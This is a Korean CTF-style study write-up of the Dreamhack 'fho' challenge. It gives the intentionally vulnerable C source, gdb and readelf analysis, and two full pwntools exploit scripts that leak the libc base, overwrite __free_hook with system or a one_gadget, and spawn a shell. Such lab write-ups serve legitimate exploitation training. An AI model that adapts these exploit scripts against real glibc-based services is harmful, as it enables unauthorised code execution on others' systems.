#one_gadget #hook #FHO
### Free Hook Overwrite

free 함수의 훅을 덮는 공격을 실습.

### 1. 파일 정보

file ./fho                          
./fho: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=54629e974f6eabe20cc6029d133b456ea4b67f12, not stripped

$ checksec fho
[*] '/home/hhro/dreamhack/fho'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

### 2. C 소스코드 분석

``` c
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  /*
  buf: 크기 0x30(=48바이트) -> 스택 버퍼
  addr, value: 사용자 입력 받아 메모리 접근에 사용
  */
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  /*
  read: 0x100(=256바이트)
  매우 큰 스택오버플로우가 발생한다. 그러나 알고 있는 정보가 없으므로 카나리를 올바르게 덮을 수 없고, 반환 주소도 유의미한 값으로 조작할 수 없는 상태이다.
  스택에 있는 데이터를 읽는데 사용할 수 있을 것 같다.
  */
  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  /*
  사용자로부터 addr(주소) 입력 받음.
  value 값 입력받음 
  *addr = value -> 해당 주소에 원하는 값을 직접 써버림 
  즉, 임의 주소 쓰기(Arbitrary Write) 취약점 
  보호 기법을 무력화할 때 활용 가능
    예: __free_hook, __malloc_hook 같은 glibc hook overwrite
    GOT 엔트 덮어쓰기
    전역 변수 변조
  */
  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  /*
  사용자 입력으로 받은 주소를 그대로 free
  즉, 임의 주소 free(Arbitrary Free) 취약점
  활용:
    더블 프리(Double Free) 상황 조작
    임의 주소를 free -> glibc heap 내부 구조 변조
    tcache poisoning, unsorted bin attack 같은 heap exploitaiton 가능
  */
  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

#### 공격 수단
1. 스택의 어떤 값을 읽을 수 있다.
2. 임의 주소에 임의 값을 쓸 수 있다.
3. 임의 주소를 해제할 수 있다.

### 3. 설계

#### 1) 라이브러리의 변수 및 함수들의 주소 구하기
\_\_free_hook, system 함수, "/bin/sh" 문자열은 libc 파일에 정의되어 있으므로, 
주어진 libc 파일로부터 이들의 오프셋을 얻을 수 있다.
```
$ readelf -sr libc-2.27.so | grep " __free_hook@"
0000003eaef0  00dd00000006 R_X86_64_GLOB_DAT 00000000003ed8e8 __free_hook@@GLIBC_2.2.5 + 0
   221: 00000000003ed8e8     8 OBJECT  WEAK   DEFAULT   35 __free_hook@@GLIBC_2.2.5

__free_hook 오프셋 = 0x3ed8e8
```
0000003eaef0 : 재배치 엔트리 위치(오프셋). 실행할 때 링커/로더가 이 위치를 고쳐 쓴다.
R_X86_64_GLOB_DAT : 이 심볼의 실제 주소를 넣어라 라는 의미. 즉, 실행 시 \_\_free_hook 의 실제 주소(0x3ed8e8)를 이 위치에 기록함.

```
$ readelf -s libc-2.27.so | grep " system@"
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

system 함수 오프셋 = 0x4f550
```

```
$ readelf -s libc-2.27.so | grep " system@"
  1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

system 함수 오프셋 = 0x4f550
```

```
$ strings -tx libc-2.27.so | grep "/bin/sh"
 1b3e1a /bin/sh

"/bin/sh" 오프셋 = 0x1b3e1a
```
-tx : -t 뒤에는 출력할 오프셋의 진법을 지정한다. 16진수로 오프셋 출력.

메모리 상에서 이들의 주소를 계산하려면, 프로세스에 매핑된 libc 파일의 베이스 주소를 알아야 한다.
libc의 베이스 주소를 알면 거기에 오프셋을 더하여 메모리 상의 주소를 구할 수 있다.
위의 설명에서 "공격 수단" 중 1번 정보인 스택의 어떤 정보를 읽을 수 있다 는 정보를 이용할 수 있는데, 스택에는 libc 의 주소가 있을 가능성이 매우 크다.
특히 main함수는 \_\_libc_start_main 이라는 라이브러리 함수가 호출하므로 main 함수 스택 프레임에 존재하는 반환 주소를 읽으면, 그 주소를 기반으로 libc 베이스 주소를 계산할 수 있고 더불어 변수와 함수들의 주소를 계산할 수 있을 것이다.

```
$ gdb ./fho
pwndbg> start
pwndbg> main
pwndbg> bt
#0  0x00005555555548be in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x5555555548ba <main>, argc=1, argv=0x7fffffffc338, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffc328) at ../csu/libc-start.c:310
#2  0x00005555555547da in _start ()
```
bt : 현재 실행중인 프로그램의 호출 스택(call stack)을 위에서부터 순서대로 보여줌
	즉, 지금 실행 중인 함수가 어떤 경로(함수 호출 체인)를 통해 실행되었는지 확인할 수 있다.
\_start -> \_\_libc_start_main -> main

#### 2) 셸 획득
앞서 익스플로잇에 필요한 변수와 함수의 주소를 구한 후, \_\_free_hook 의 값을 system 함수의 주소로 덮어쓰고, "/bin/sh" 를 해제(free)  하게 되면 system("/bin/sh")가 호출되어 셸을 획득할 수 있다.

### 4. 익스플로잇

#### 1) 라이브러리의 변수 및 함수들의 주소 구하기
main 함수의 반환 주소인 libc_start_main+x 를 릭하여 libc 베이스 주소를 구하고 변수 및 함수의 주소를 계산.

main 함수는 라이브러리 함수인 \_\_libc_start_main 이 호출하므로, main 함수의 스택 프레임에는 \_\_libc_start_main+x 로 돌아갈 반환주소가 저장되어 있을 것이다.
\_\_libc_start_main+x 는 libc 영역 어딘가에 존재하는 코드이므로 \_\_libc_start_main+x의 주소를 릭한 후 해당 값에서 libc_start_main+x의 오프셋을 빼는 방식으로 프로세스 메모리에 매핑된 libc의 베이스 주소를 계산할 수 있다.

```
$ gdb fho
pwndbg> b *main
Breakpoint 1 at 0x8ba
pwndbg> r
pwndbg> bt
#0  0x00005625b14008ba in main ()
#1  0x00007f5ae2f1cc87 in __libc_start_main (main=0x5625b14008ba <main>, argc=1, argv=0x7ffdf39f3ed8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffdf39f3ec8) at ../csu/libc-start.c:310
#2  0x00005625b14007da in _start ()
pwndbg> x/i 0x00007f5ae2f1cc87
   0x7f5ae2f1cc87 <__libc_start_main+231>:  mov    edi,eax
pwndbg>
```

위 #1 부분에서 확인할 수 있듯이 main  함수의 반환주소는 0x00007f5ae2f1cc87 이고, x/i로 명령어를 출력해보면 __libc_start_main+231 인 것을 확인할 수 있다. 
libc_start_main+231 의 오프셋은 다음과 같이 readelf 명령어로 구할 수 있다.

```
$ readelf -s libc-2.27.so | grep " __libc_start_main@"
  2203: 0000000000021b10   446 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5

--> __libc_start_main+231의 오프셋 = 0x21b10+231
```

따라서 main 함수의 반환 주소인  \_\_libc_start_main+231 를 릭한 후, 해당 값에서 0x21b10+231 를 빼면 libc의 베이스 주소를 구할 수 있다.
libc의 베이스주소를 구한 후에는 \_\_free_hook, system 함수, "/bin/sh" 문자열의 오프셋을 더해서 이들의 주소 값도 계산이 가능하다.

#### 도커 선행 작업

1.도커 컨테이너에 libc-2.27.so 파일 복사해 넣기
칼리 호스트 디렉토리에서 
docker cp ./libc-2.27.so d4490cb00dd2:/root

2.LD_PRELOAD 환경변수 설정
프로그램이 실행될 때 공유 라이브러리를 우선적으로 로드하도록 지시하는 환경변수.

export LD_PRELOAD=$(realpath ./libc-2.27.so)
: realpath ./libc-2.27.so
-> ./libc-2.27.so 의 절대 경로(예: /root//libc-2.27.so)를 문자열로 반환.
: $(...)
-> 그 문자열을 LD_PRELOAD 값으로 치환.

ldd ./fho 로 확인 가능


#### 2) 셸 획득

라이브러리 변수 및 함수들의 주소 구하기
``` python
#!/usr/bin/env python3
# Name: fho.py

from pwn import *

# ELF('./libc-2.27.so) : libc 심볼 및 문자열 검색 가능.
# p = process('./fho')
p = remote("host8.dreamhack.games", 9291)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
'''
buf = b'A'*0x48
: 스택 버퍼 오버플로우 취약점을 활용하여 buf의 위치 [rbp+0x40] 에 SFP(0x08)을 더비데이터로 전달
p.sendafter('Buf: ', buf)
: 화면에 "Buf: " 프롬프트가 뜨면 payload 전송
p.recvuntil(buf)
: echo된 payload 까지 읽음 -> 그 이후에 나오는 스택 상 libc주소를 수집 가능.
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
: p.recvline() 명령에 의해 스택의 다음 위치(main 함수의 RET)의 바이트 데이트를 받아들임.서
: 들어오는 데이터 -> b'\xa8\xbc\xc5\xbcJ\x7f'
: [:-1] -> recvline()으로 받기 때문에 마지막에 "\n"을 함께 받게 되는데 이것을 제거하기 위해.
: 가장 뒤에 '\x00'을 2개 추가하는 것은 전달받은 데이터는 6바이트이므로 8바이트를 맞추기 위해.
: u64() -> 바이트로 들어온 주소는 코드에서 연산(+, -)을 하여야 하므로 바이트 문자열을 정수로 변환함.
: b'\xa8\xfc\xa2\x15\xcc\x7f\x00\x00' -> 0x7fb503487ca8 로 변환됨.
libc_start_main_xx 
: 이 주소값은 libc_start_main에서 xx 만큼 떨어져있는 주소이다.
: 예) 0x7f5ae2f1cc87 <__libc_start_main+231>:  mov    edi,eax
: 해서 __libc_start_main의 옵셋을 구할때도 그 옵셋에 xx 만큼의 차이값을 더해주는 것.

libc_base를 이용하여 익스플로잇에 필요한 함수, 변수, 문자열의 주소값 얻기.

next(libc.search(b'/bin/sh'))
: libc.search(b'/bin/sh')의 결과로 ELF파일에서 해당 바이트 시퀀스가 나타나는 위치를 찾음.
: 결과는 generator 객체로 반환
: generator = 순회 가느한 객체이지만, 실제 값들은 아직 계산되지 않음.
: 예: /bin/sh 가 1개 이상 나타날 수도 있음.
: next() -> generator에서 첫 번째 값을 가져오는 함수. 여러개중 첫번째 것을 이용하겠다는 말.!!!!
'''
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return

system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)
```


free_hook 주소를 system 주소로 덮어쓰기
``` python
# [2] Overwrite 'free_hook' with 'system'
'''
서버가 "To write: " 라는 문자열을 출력할 때까지 기다림
이후 str(free_hook) -> "140189710252648" 문자열
encode() 하면 바이트문자열 b"140189710252648"
따라서 서버에 전송되는 내용은:
140189710252648\n
0x31 0x34 0x30 0x31 0x38 0x39 0x37 0x31 0x30 0x32 0x35 0x32 0x36 0x34 0x38 0x0a
즉, 네트워크로 전달될 때는 ASCII문자 시퀀스로 전달된다.
C 소스코드에서
scanf("%llu", &addr); 로 받는다면
    문자열 140189710252648\n 을 읽어서
    10진수 정수 140189710252648 로 변환해서
    addr 변수(8바이트 long)에 저장한다.

처음에는 free_hook 주소를 전달하고, 두번째로는 system 주소를 전달했다.
C 소스코드에서
*addr = value; 에 의해 
free_hook 주소를 가리키는 포인터 값을 system 주소를 가리키는 값으로 덮어 쓴다.
'''
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())
```


C소스에서 free() 가 실행될 때 인자로 "/bin/sh"주소 전달하기 
``` python
# [3] Exploit
# C소스에서 scanf("%llu", &addr); 로 입력할 값을 binsh를 전달.
# free(addr); 로 free를 실행할 때 "/bin/sh"의 주소를 인자로 받게된다.
# 이 때 free함수의 훅 변수를 system의 주소로 Overwrite를 했으므로 결과는 system("/bin/sh")이 실행되게 된다.
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```


### +a, one_gadget 이용 방식

원 가젯 또는 magic_gadget 은 실행하면 셸이 획득되는 코드 뭉치이다.
기존에는 셸을 획득하기 위해 여러 개의 가젯을 조합해서 ROP Chain을 구성하거나 RTL 공격을 수행했지만, 원 가젯은 단일 가젯만으로도 셸을 실행할 수 있는 매우 강력한 가젯이다.

원 가젯은 함수에 인자를 전달하기 어려울 때 유용하게 활용할 수 있다.
예를 들어 \_\_malloc_hook 을 임의의 값으로 오버라이트 할 수 있지만, malloc의 인자에 작은 정수 밖에 입력할 수 없는 상황이라면 "/bin/sh" 문자열 주소를 인자로 전달하기가 매우 어렵다. 
이럴 때 제약조건을 만족하는 원 가젯이 존재한다면, 이를 호출해서 셸을 획득할 수 있다.

```
$ one_gadget ./libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

#### one_gadget 실습
``` python
#!/usr/bin/env python3
# Name: fho_og.py

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak libc base
'''
Buf: 프롬프트 이후에 0x48 길이만큼 A를 채워서 보냄 → 오버플로우 유도.
그 다음 프로그램에서 libc 함수 주소 일부(__libc_start_main 관련 주소)를 누수(leak)하도록 설계되어 있음.
p.recvline()[:-1] : 개행(\n) 제거
+ b'\x00'*2 : libc 주소는 6바이트까지만 leak되므로, 나머지 상위 2바이트를 0x00으로 채움.
u64(...) : leak한 바이트열을 64비트 정수로 변환.
__libc_start_main 반환 지점에서 leak된 주소에서 오프셋을 빼서 libc base 주소를 계산.

+231 은 __libc_start_main 내부에서 실제 반환 주소까지의 offset.
__free_hook 의 실제 메모리 주소 계산.
og 는 one-gadget RCE (system("/bin/sh") 같은 동작을 대신하는 gadget).
0x4f432 는 libc-2.27.so에서 유명한 one-gadget offset.
'''
buf = b'A'*0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# 또는 libc_base = libc_start_main_xx - libc.libc_start_main_return
free_hook = libc_base + libc.symbols['__free_hook']
og = libc_base+0x4f432

slog('libc_base', libc_base)
slog('free_hook', free_hook)
slog('one-gadget', og)

# [2] Overwrite `free_hook` with `og`, one-gadget address
'''
바이너리가 To write:라고 물어보면, 몇 번지에 쓸지를 물어보는 것. → __free_hook 주소 전달.
With: 라고 물어보면, 그 위치에 쓸 값을 입력. → one-gadget 주소 전달.
즉, __free_hook → one-gadget 덮어쓰기.
'''
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(og).encode())

# [3] Exploit
'''
바이너리가 free()를 실행하는 타이밍에서 입력을 받아 free() 실행 → 실제로는 __free_hook 호출.
우리가 덮어놓은 값(one-gadget)이 실행됨 → 쉘 획득.어
왜 0x31337 인가?
    사실 아무 값이나 넣어도 된다.
    이미 free_hook을 og로 덮어놨기 때문에 free 자체가 exploit trigger 가 되는 것이다.
    31337 -> "eleet(엘리트)" 해커 은
'''
p.recvuntil('To free: ')
p.sendline(str(0x31337).encode())

p.interactive()
```